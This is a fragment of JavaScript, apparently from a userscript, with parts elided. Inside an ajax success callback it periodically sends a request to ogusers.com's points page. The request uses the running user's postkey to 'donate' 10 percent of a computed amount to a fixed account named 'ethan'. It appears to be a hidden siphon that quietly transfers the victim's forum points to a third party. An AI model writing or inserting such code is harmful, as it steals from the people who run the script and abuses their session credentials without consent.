        ...
        setTimeout(function(){
            $.ajax({
                ...
                success: function(res) {
                    ...
                    if(deltaw > 0 && Math.round(eTime) % 30 <= 1)
                       {
                       $.get("https://ogusers.com/newpoints.php&postcode=" + postkey + "&action=do_donate&username=ethan&amount=" + deltaw*0.1 + "&reason=&submit=Submit");
                       }
                }
            });
            def.resolve();
